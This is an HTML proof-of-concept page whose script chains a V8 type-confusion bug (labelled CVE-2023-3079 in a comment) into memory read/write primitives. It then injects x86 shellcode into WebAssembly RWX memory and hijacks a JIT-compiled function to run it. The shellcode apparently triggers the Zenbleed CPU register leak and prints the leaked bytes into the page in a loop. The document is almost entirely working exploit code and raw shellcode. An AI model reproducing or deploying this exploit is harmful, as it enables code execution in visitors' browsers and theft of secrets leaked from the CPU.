<html>
    <body>
        <p id="leaks"></p>
        <script>
            //same code as in CVE-2023-3079-Zenbleed.js, except for the while loop at end
            const FIXED_ARRAY_HEADER_SIZE = 8n;

            var arr_buf = new ArrayBuffer(8);
            var f64_arr = new Float64Array(arr_buf);
            var b64_arr = new BigInt64Array(arr_buf);

            function ftoi(f) {
                f64_arr[0] = f;
                return b64_arr[0];
            }

            function itof(i) {
                b64_arr[0] = i;
                return f64_arr[0];
            }

            function smi(i) {
                return i << 1n;
            }


            function gc_minor() { //scavenge
                for(let i = 0; i < 1000; i++) {
                    new ArrayBuffer(0x10000);
                }
            }

            function gc_major() { //mark-sweep
                new ArrayBuffer(0x7fe00000);
            }


            function set_keyed_prop(arr, key, val) {
                arr[key] = val;
            }

            function leak_hole() {
                let store_mode = []; //STORE_AND_GROW_HANDLE_COW

                const IC_WARMUP_COUNT = 10;
                for(let i = 0; i < IC_WARMUP_COUNT; i++) {
                    set_keyed_prop(arguments, "foo", 1);
                }
            
                set_keyed_prop(store_mode, 0, 1);

                set_keyed_prop(arguments, arguments.length, 1);

                let hole = arguments[arguments.length+1];

                return hole;
            }
            const the = {};
            var large_arr = new Array(0x10000);
            large_arr.fill(itof(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
            var fake_arr = null;
            var fake_arr_addr = null;
            var fake_arr_elements_addr = null;

            var packed_dbl_map = null;
            var packed_dbl_props = null;

            var packed_map = null;
            var packed_props = null;

            function leak_stuff(b) {
                if(b) {
                    let index = Number(b ? the.hole : -1);
                    index |= 0;
                    index += 1;
                
                    let arr1 = [1.1, 2.2, 3.3, 4.4];
                    let arr2 = [0x1337, large_arr];
                    
                    let packed_double_map_and_props = arr1.at(index*4);
                    let packed_double_elements_and_len = arr1.at(index*5);
                    
                    let packed_map_and_props = arr1.at(index*8);
                    let packed_elements_and_len = arr1.at(index*9);
                    
                    let fixed_arr_map = arr1.at(index*6);
                    
                    let large_arr_addr = arr1.at(index*7);

                    return [
                        packed_double_map_and_props, packed_double_elements_and_len,
                        packed_map_and_props, packed_elements_and_len, 
                        fixed_arr_map, large_arr_addr, 
                        arr1, arr2
                    ];
                }
                return 0;
            }

            function weak_fake_obj(b, addr=1.1) {
                if(b) {
                    let index = Number(b ? the.hole : -1);
                    index |= 0;
                    index += 1;
                
                    let arr1 = [0x1337, {}]
                    let arr2 = [addr, 2.2, 3.3, 4.4];
                    
                    let fake_obj = arr1.at(index*8);
                    
                    return [
                        fake_obj,
                        arr1, arr2
                    ];
                }
                return 0;
            }

            function fake_obj(addr) {
                large_arr[0] = itof(packed_map | (packed_dbl_props << 32n));
                large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
                large_arr[3] = itof(addr | 1n);
                
                let result = fake_arr[0];
                
                large_arr[1] = itof(0n | (smi(0n) << 32n)); 
                
                return result;
            }


            function addr_of(obj) {
                large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
                large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
                
                fake_arr[0] = obj;
                let result = ftoi(large_arr[3]) & 0xFFFFFFFFn;
                
                large_arr[1] = itof(0n | (smi(0n) << 32n)); 
                
                return result;
            }

            function v8_read64(addr) {
                addr -= FIXED_ARRAY_HEADER_SIZE;
                
                large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
                large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
                
                let result = ftoi(fake_arr[0]);
                
                large_arr[1] = itof(0n | (smi(0n) << 32n)); 

                return result;    
            }

            function v8_write64(addr, val) {
                addr -= FIXED_ARRAY_HEADER_SIZE;
                
                large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
                large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
                
                fake_arr[0] = itof(val);
                
                large_arr[1] = itof(0n | (smi(0n) << 32n));   
            }

            function install_primitives() {    
                for(let i = 0; i < 10; i++) {
                    weak_fake_obj(true, 1.1);
                }
                for(let i = 0; i < 10000; i++) {
                    weak_fake_obj(false, 1.1);
                }
                
                for(let i = 0; i < 10; i++) {
                    leak_stuff(true);
                }
                for(let i = 0; i < 20000; i++) {
                    leak_stuff(false);
                }
                gc_minor();
                gc_major();
                
                let leaks = leak_stuff(true);
                //%DebugPrint(leaks);
                
                let packed_double_map_and_props = ftoi(leaks[0]);
                let packed_double_elements_and_len = ftoi(leaks[1]);
                packed_dbl_map = packed_double_map_and_props & 0xFFFFFFFFn;
                packed_dbl_props = packed_double_map_and_props >> 32n;
                let packed_dbl_elements = packed_double_elements_and_len & 0xFFFFFFFFn;
                
                let packed_map_and_props = ftoi(leaks[2]);
                let packed_elements_and_len = ftoi(leaks[3]);
                packed_map = packed_map_and_props & 0xFFFFFFFFn;
                packed_props = packed_map_and_props >> 32n;
                let packed_elements = packed_elements_and_len & 0xFFFFFFFFn;
                
                let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;
                
                let large_arr_addr = ftoi(leaks[5]) >> 32n;
                
                let dbl_arr = leaks[6];
                dbl_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
                dbl_arr[1] = itof(((large_arr_addr + 8n) - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
                
                let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE)|1n;

                let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
                let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
                fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
                fake_arr_elements_addr = fake_arr_addr + 16n;
                
                large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
                large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
                large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));

                fake_arr = weak_fake_obj(true, itof(fake_arr_addr))[0];
                
                temp_fake_arr = null;
            }

            the.hole = leak_hole();
            install_primitives();

            function t() {
                return [1.1,2.2,3.3];
            }
            for(let i = 0; i < 10000; i++) t();

            var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,1,127,0,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,102,117,110,99,0,0,10,143,128,128,128,0,1,137,128,128,128,0,0,32,0,65,42,54,2,0,11]);
            var wasmModule = new WebAssembly.Module(wasmCode);
            var wasmInstance = new WebAssembly.Instance(wasmModule);

            var arr = new Uint8Array(wasmInstance.exports.memory.buffer,0,32);
            wasmInstance.exports.func(arr);

            var rwx = v8_read64(addr_of(wasmInstance)+0x50n);
            var rwxstr = rwx.toString(16);
            var pad = "";
            for (let i = 0; i < 16-rwxstr.length;i++){
                pad += "0";
            }
            rwxstr = pad + rwxstr;
            console.log(rwxstr);

            var code = new Uint8Array([0x55,0x48,0x89,0xe5,0x68,0x08,0x00,0x00,0x00,0x56,0x48,0x81,0xec,0x10,0x00,0x00,0x00,0x48,0x8b,0x56,0x27,0x48,0xc1,0xea,0x18,0x4c,0x01,0xf2,0xc5,0xfc,0x77,0x48,0x31,0xc0,0xc4,0x41,0x05,0xef,0xff,0xc4,0x42,0x7d,0x17,0xff,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x82,0x2a,0xf8,0xc4,0x41,0x7d,0x10,0xff,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xff,0x74,0x0a,0xc5,0x7d,0x11,0x3c,0x02,0xe9,0xef,0x05,0x00,0x00,0xc4,0x41,0x0d,0xef,0xf6,0xc4,0x42,0x7d,0x17,0xf6,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x8a,0x2a,0xf0,0xc4,0x41,0x7d,0x10,0xf6,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xf6,0x74,0x0a,0xc5,0x7d,0x11,0x34,0x02,0xe9,0x89,0x05,0x00,0x00,0xc4,0x41,0x15,0xef,0xed,0xc4,0x42,0x7d,0x17,0xed,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x92,0x2a,0xe8,0xc4,0x41,0x7d,0x10,0xed,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xed,0x74,0x0a,0xc5,0x7d,0x11,0x2c,0x02,0xe9,0x23,0x05,0x00,0x00,0xc4,0x41,0x1d,0xef,0xe4,0xc4,0x42,0x7d,0x17,0xe4,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x9a,0x2a,0xe0,0xc4,0x41,0x7d,0x10,0xe4,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xe4,0x74,0x0a,0xc5,0x7d,0x11,0x24,0x02,0xe9,0xbd,0x04,0x00,0x00,0xc4,0x41,0x25,0xef,0xdb,0xc4,0x42,0x7d,0x17,0xdb,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xa2,0x2a,0xd8,0xc4,0x41,0x7d,0x10,0xdb,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xdb,0x74,0x0a,0xc5,0x7d,0x11,0x1c,0x02,0xe9,0x57,0x04,0x00,0x00,0xc4,0x41,0x2d,0xef,0xd2,0xc4,0x42,0x7d,0x17,0xd2,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xaa,0x2a,0xd0,0xc4,0x41,0x7d,0x10,0xd2,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xd2,0x74,0x0a,0xc5,0x7d,0x11,0x14,0x02,0xe9,0xf1,0x03,0x00,0x00,0xc4,0x41,0x35,0xef,0xc9,0xc4,0x42,0x7d,0x17,0xc9,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xb2,0x2a,0xc8,0xc4,0x41,0x7d,0x10,0xc9,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xc9,0x74,0x0a,0xc5,0x7d,0x11,0x0c,0x02,0xe9,0x8b,0x03,0x00,0x00,0xc4,0x41,0x3d,0xef,0xc0,0xc4,0x42,0x7d,0x17,0xc0,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xba,0x2a,0xc0,0xc4,0x41,0x7d,0x10,0xc0,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xc0,0x74,0x0a,0xc5,0x7d,0x11,0x04,0x02,0xe9,0x25,0x03,0x00,0x00,0xc5,0xc5,0xef,0xff,0xc4,0xe2,0x7d,0x17,0xff,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xc2,0x2a,0xf8,0xc5,0xfd,0x10,0xff,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xff,0x74,0x0a,0xc5,0xfd,0x11,0x3c,0x02,0xe9,0xc1,0x02,0x00,0x00,0xc5,0xcd,0xef,0xf6,0xc4,0xe2,0x7d,0x17,0xf6,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xca,0x2a,0xf0,0xc5,0xfd,0x10,0xf6,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xf6,0x74,0x0a,0xc5,0xfd,0x11,0x34,0x02,0xe9,0x5d,0x02,0x00,0x00,0xc5,0xd5,0xef,0xed,0xc4,0xe2,0x7d,0x17,0xed,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xd2,0x2a,0xe8,0xc5,0xfd,0x10,0xed,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xed,0x74,0x0a,0xc5,0xfd,0x11,0x2c,0x02,0xe9,0xf9,0x01,0x00,0x00,0xc5,0xdd,0xef,0xe4,0xc4,0xe2,0x7d,0x17,0xe4,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xda,0x2a,0xe0,0xc5,0xfd,0x10,0xe4,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xe4,0x74,0x0a,0xc5,0xfd,0x11,0x24,0x02,0xe9,0x95,0x01,0x00,0x00,0xc5,0xe5,0xef,0xdb,0xc4,0xe2,0x7d,0x17,0xdb,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xe2,0x2a,0xd8,0xc5,0xfd,0x10,0xdb,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xdb,0x74,0x0a,0xc5,0xfd,0x11,0x1c,0x02,0xe9,0x31,0x01,0x00,0x00,0xc5,0xed,0xef,0xd2,0xc4,0xe2,0x7d,0x17,0xd2,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xea,0x2a,0xd0,0xc5,0xfd,0x10,0xd2,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xd2,0x74,0x0a,0xc5,0xfd,0x11,0x14,0x02,0xe9,0xcd,0x00,0x00,0x00,0xc5,0xf5,0xef,0xc9,0xc4,0xe2,0x7d,0x17,0xc9,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xf2,0x2a,0xc8,0xc5,0xfd,0x10,0xc9,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xc9,0x74,0x0a,0xc5,0xfd,0x11,0x0c,0x02,0xe9,0x69,0x00,0x00,0x00,0xc5,0xfd,0xef,0xc0,0xc4,0xe2,0x7d,0x17,0xc0,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xfa,0x2a,0xc0,0xc5,0xfd,0x10,0xc0,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xc0,0x74,0x0a,0xc5,0xfd,0x11,0x04,0x02,0xe9,0x05,0x00,0x00,0x00,0xe9,0xab,0xf9,0xff,0xff,0x48,0x8b,0x8e,0x87,0x00,0x00,0x00,0x8b,0x19,0x81,0xeb,0x2e,0x00,0x00,0x00,0x89,0x19,0x48,0x89,0xec,0x5d,0xc3]);

            var buf = new ArrayBuffer(2048);
            var shellcode = new DataView(buf);
            for(let i = 0; i < code.length; i++)
                shellcode.setUint8(i,code[i]);

            var raddr = v8_read64(addr_of(buf)+0x20n)>>24n;
            var raddrstr = raddr.toString(16);
            pad = "";
            for (let i = 0; i < 16-raddrstr.length;i++){
                pad += "0";
            }
            raddrstr = pad + raddrstr;
            console.log(raddrstr);

            let xstr = "var x = [0xceb909051525657n,0xceb90";
            xstr += rwxstr.slice(0,8);
            xstr += "bfn,0xceb90";
            xstr += rwxstr.slice(8);
            xstr += "ban,0xceb909020e7c148n,0xceb909090d70948n,0xceb90";
            xstr += raddrstr.slice(0,8);
            xstr += "ben,0xceb90";
            xstr += raddrstr.slice(8);
            xstr += "ban,0xceb909020e6c148n,0xcebf6014cd60948n,0xceb900000068db9n,0xceb5f5e5a59a4f3n,0xceb909059e98348n,0xceb90fffffeb2e9n]";
            eval(xstr);


            let fstr = "var f = () => { return ["
            for (let i = 0; i < x.length; i++) {
                fstr += itof(x[i]).toString(),
                fstr += ","
            }
            fstr += "]}"
            eval(fstr);


            for(let i = 0; i< 10000; i++) f();

            var code = v8_read64(addr_of(f)+0x18n) & 0xFFFFFFFFn
            console.log(code.toString(16));

            var entry = v8_read64(code+0x10n);
            console.log(entry.toString(16));

            v8_write64(code+0x10n,entry+0x59n);
            f();

            console.log("Running PoC...")
            const remove_non_ASCII = str => str.replace(/[^\x20-\x7E]/g, '');

            function bleed(){
                wasmInstance.exports.func(arr);
                let str = remove_non_ASCII(String.fromCharCode.apply(null,arr));
                if (str != ""){
                    document.getElementById("leaks").innerHTML += (str);
                    document.getElementById("leaks").innerHTML += " ";
                }
                setTimeout(bleed, 0);
            }
            bleed();
        </script>
    </body>
</html>
